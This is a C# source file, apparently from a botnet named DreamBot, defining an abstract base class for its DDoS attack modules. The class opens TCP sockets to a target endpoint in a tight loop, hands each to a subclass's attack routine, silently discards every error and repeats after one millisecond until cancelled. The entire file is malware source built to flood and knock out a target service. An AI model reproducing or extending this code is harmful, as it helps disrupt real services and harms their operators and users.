using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace DreamBot.Actions.DDoS
{
    abstract class Attack
    {
        protected readonly EndPoint _endpoint;
        private BackgroundWorker _worker;

        protected Attack(EndPoint endpoint)
        {
            _endpoint = endpoint;
        }

        public void Run()
        {
            while (!IsCancelled)
            {
                try
                {
                    using (var socket = CreateSocket())
                    {
                        DoIt(socket);
                    }
                }
                catch
                {
                }

                Thread.Sleep(1);
            }
        }

        protected virtual Socket CreateSocket()
        {
            return new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp) {
                                                                                                ReceiveTimeout = 1
                                                                                            };
        }

        protected abstract void DoIt(Socket socket);

        public bool IsCancelled { get { return _worker.CancellationPending; } }

        public void Run(object sender, DoWorkEventArgs e)
        {
            _worker = sender as BackgroundWorker;
            Run();
        }
    }
}